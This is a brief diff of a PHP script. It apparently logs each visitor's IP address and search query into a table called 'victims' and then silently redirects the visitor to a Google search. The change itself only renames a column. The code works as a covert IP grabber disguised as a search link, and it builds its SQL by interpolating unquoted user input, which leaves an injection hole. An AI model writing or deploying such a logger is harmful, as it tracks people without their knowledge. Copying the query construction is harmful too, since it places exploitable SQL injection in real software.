@@ -20,9 +20,9 @@
             $q = htmlspecialchars($_GET['query']);
 
         
-            $sql = "INSERT INTO victims (ip, q) VALUES ('{$ip}', {$q});";
+            $sql = "INSERT INTO victims (ip, query) VALUES ('{$ip}', {$q});";
             $result = mysqli_query($conn, $sql);
-            
+
             $url= "https://www.google.com/search?q=" . $q;
             header("Location: $url"); 
 
